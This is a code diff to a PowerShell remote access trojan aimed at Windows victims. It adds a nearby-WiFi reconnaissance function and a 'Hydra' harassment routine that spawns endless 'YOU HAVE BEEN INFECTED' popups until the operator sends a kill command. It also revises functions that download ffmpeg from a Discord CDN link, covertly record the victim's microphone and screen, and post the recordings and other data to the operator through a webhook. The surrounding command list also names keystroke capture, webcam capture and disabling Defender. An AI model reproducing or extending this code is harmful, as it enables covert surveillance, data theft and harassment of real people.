@@ -79,6 +79,8 @@ Is-Admin   : Checks if session has admin Privileges
 Attempt-Elevate  : Send user a prompt to gain Admin
 Message   : Send a custom message to the user
 Take-Picture  : Send a Webcann picture.
+Nearby-Wifi  : Show nearby wifi networks       
+Send-Hydra  : Never ending popups (use killswitch)   
 Kill    : Killswitch for 'Key-Capture' and 'Exfiltrate' 
 **ADMIN ONLY FUNCTIONS**
 Disable-AV   : Attempt to exclude C:/ from Defender
@@ -152,6 +154,49 @@ if (Test-Path -Path $path){
 }else{Write-Host "File Not Found: $path"}
 }
 
+Function Nearby-Wifi {
+$showNetworks = explorer.exe ms-availablenetworks:
+sleep 5
+$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim() | Format-Table SSID, Signal, Band
+$Wifi = ($NearbyWifi|Out-String)
+$contents = "$wifi"
+Post-Message
+}
+
+Function Send-Hydra {
+Add-Type -AssemblyName System.Windows.Forms
+$contents = "$comp $env:COMPUTERNAME $waiting Sent Hydra to User.."
+Post-Message
+    function Create-Form {
+        $form = New-Object Windows.Forms.Form;$form.Text = "  __--** YOU HAVE BEEN INFECTED BY HYDRA **--__ ";$form.Font = 'Microsoft Sans Serif,12,style=Bold';$form.Size = New-Object Drawing.Size(300, 170);$form.StartPosition = 'Manual';$form.BackColor = [System.Drawing.Color]::Black;$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog;$form.ControlBox = $false;$form.Font = 'Microsoft Sans Serif,12,style=bold';$form.ForeColor = "#FF0000"
+        $Text = New-Object Windows.Forms.Label;$Text.Text = "Cut The Head Off The Snake..`n`n    ..Two More Will Appear";$Text.Font = 'Microsoft Sans Serif,14';$Text.AutoSize = $true;$Text.Location = New-Object System.Drawing.Point(15, 20)
+        $Close = New-Object Windows.Forms.Button;$Close.Text = "Close?";$Close.Width = 120;$Close.Height = 35;$Close.BackColor = [System.Drawing.Color]::White;$Close.ForeColor = [System.Drawing.Color]::Black;$Close.DialogResult = [System.Windows.Forms.DialogResult]::OK;$Close.Location = New-Object System.Drawing.Point(85, 100);$Close.Font = 'Microsoft Sans Serif,12,style=Bold'
+        $form.Controls.AddRange(@($Text, $Close));return $form
+    }
+    while ($true) {
+        $form = Create-Form
+        $form.StartPosition = 'Manual'
+        $form.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
+        $result = $form.ShowDialog()
+    
+        $messages = Invoke-RestMethod -Uri $GHurl
+        if ($messages.message.text -contains "kill") {
+            $contents = "$comp $env:COMPUTERNAME $closed Hydra Stopped!"
+            Post-Message
+            break
+        }
+
+        if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
+            $form2 = Create-Form
+            $form2.StartPosition = 'Manual'
+            $form2.Location = New-Object System.Drawing.Point((Get-Random -Minimum 0 -Maximum 1000), (Get-Random -Minimum 0 -Maximum 1000))
+            $form2.Show()
+        }
+        $random = (Get-Random -Minimum 0 -Maximum 2)
+        Sleep $random
+    }
+}
+
 Function SpeechToText {
 $contents = "$tick $env:COMPUTERNAME $tick Transcription Started.. (Stop with Killswitch)"
 Post-Message
@@ -177,19 +222,16 @@ while ($true) {
 
 Function Record-Audio{
 param ([int[]]$t)
-$contents = "$env:COMPUTERNAME $tick Recording Started for $t seconds.."
-Post-Message | Out-Null
 $Path = "$env:Temp\ffmpeg.exe"
 If (!(Test-Path $Path)){  
 $url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
 iwr -Uri $url -OutFile $Path
 }
-sleep 1
-
+$contents = "$comp $env:COMPUTERNAME $tick Recording Started for $t seconds.."
+Post-Message | Out-Null
 Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
 function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
 $id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName
-
 $filePath = "$env:Temp\AudioClip.mp3"
 if ($t.Length -eq 0){$t = 10}
 .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $filePath
@@ -200,17 +242,16 @@ rm -Path $filePath -Force
 
 Function Record-Screen{
 param ([int[]]$t)
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 $Path = "$env:Temp\ffmpeg.exe"
 If (!(Test-Path $Path)){  
 $url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
 iwr -Uri $url -OutFile $Path
 }
-sleep 1
+$contents = "$comp $env:COMPUTERNAME $tick Recording Started for $t seconds.."
+Post-Message | Out-Null
 $filePath = "$env:Temp\ScreenClip.mkv"
 if ($t.Length -eq 0){$t = 10}
-.$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $filePath
+.$env:Temp\ffmpeg.exe -f gdigrab -t $t -framerate 25 -i desktop $filePath
 Post-File
 sleep 1
 rm -Path $filePath -Force
